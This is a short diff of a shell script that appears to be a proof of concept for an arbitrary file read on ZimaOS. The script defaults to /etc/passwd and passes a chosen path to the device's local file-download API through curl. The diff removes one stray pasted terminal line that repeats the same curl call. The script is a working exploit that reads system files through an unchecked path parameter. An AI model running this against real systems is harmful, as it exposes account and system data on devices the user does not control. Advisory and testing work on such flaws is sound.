@@ -18,4 +18,3 @@ DEFAULT_FILEPATH="/etc/passwd"
 FILEPATH="${1:-${DEFAULT_FILEPATH}}"
 
 curl "http://127.0.0.1/v2_1/files/file/download?path=${FILEPATH}"
-zimab@ZimaOS:~/nonpriv ➜ $ curl "http://127.0.0.1/v2_1/files/file/download?path=${PATH}"
